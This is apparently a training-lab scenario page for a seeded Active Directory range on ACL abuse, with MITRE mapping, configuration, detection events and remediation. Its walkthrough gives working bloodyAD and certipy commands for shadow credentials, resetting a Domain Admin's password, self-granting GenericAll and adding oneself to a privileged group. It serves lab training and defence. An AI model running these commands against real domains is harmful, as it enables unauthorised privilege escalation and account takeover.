# Scenario 7 - ACL Abuse

| | |
|---|---|
| **MITRE ATT&CK** | T1222 - File and Directory Permissions Modification; T1098 - Account Manipulation |
| **Toggle** | `misconfig.acl_abuse` |
| **Role** | `misconfig_acl` |
| **Footholds** | `eevans` (GenericAll on `OU=Engineering`) and `cclark` (WriteDACL on `Tier1_Admins`) |

## Objective

Escalate from an ordinary user by abusing overly broad Active Directory ACLs,
without cracking any password and without a service account.

## Seeded configuration

| Principal | Right | Target |
|-----------|-------|--------|
| `eevans` | `GenericAll` | `OU=Engineering,OU=Users,OU=_LAB,DC=corp,DC=contoso,DC=lab` |
| `cclark` | `WriteDACL` | `CN=Tier1_Admins,OU=Groups,OU=_LAB,DC=corp,DC=contoso,DC=lab` |

`GenericAll` on the OU inherits to its children — including the two Domain
Admins, `aanderson` and `bbrown`, who live in `OU=Engineering`. `WriteDACL`
over `Tier1_Admins` lets `cclark` grant themselves membership.

## Attack walkthrough

```bash
# --- Path A: eevans -> targets the Domain Admins via GenericAll -----------
# 1. Confirm the inherited right.
bloodyAD --host 10.10.10.10 -d corp.contoso.lab -u eevans -p '<password>' \
  get object 'OU=Engineering,OU=Users,OU=_LAB,DC=corp,DC=contoso,DC=lab'

# 2a. Shadow credentials (msDS-KeyCredentialLink) on aanderson.
certipy shadow auto -u eevans@corp.contoso.lab -p '<password>' \
  -account aanderson -dc-ip 10.10.10.10

# 2b. Or simply reset the password, since GenericAll permits it.
bloodyAD --host 10.10.10.10 -d corp.contoso.lab -u eevans -p '<password>' \
  set password aanderson 'NewP@ssw0rd!2024'

# --- Path B: cclark -> Tier1_Admins via WriteDACL -------------------------
bloodyAD --host 10.10.10.10 -d corp.contoso.lab -u cclark -p '<password>' \
  add genericAll 'CN=Tier1_Admins,OU=Groups,OU=_LAB,DC=corp,DC=contoso,DC=lab' cclark
bloodyAD --host 10.10.10.10 -d corp.contoso.lab -u cclark -p '<password>' \
  add groupMember Tier1_Admins cclark
```

### BloodHound view

The engine propagates the OU ACE down to `aanderson`/`bbrown` (with a
containment penalty) so the graph shows the real escalation even though the ACE
was set on the OU, not the user. The finding
`Write access over user objects` is reported.

## Detection

- **4662** - An operation was performed on an object: watch for
  `WriteDACL`, `GenericAll`, and `msDS-KeyCredentialLink` writes.
- **5136** - A directory service object was modified (ACL or key credential).
- **4728 / 4732** - Member added to a security-enabled global/local group.

## Remediation

- Audit and remove broad ACEs on OUs and groups; use tiered delegation.
- Enable **SACL** auditing on privileged objects and alert on ACL changes.
- Deploy **Microsoft Defender for Identity** or equivalent to flag ACL abuse.
- Remove standing `WriteDACL`/`GenericAll` from non-Tier-0 principals.

## References

- MITRE T1222, T1098
- "Shadow Credentials" (Elad Shamir)
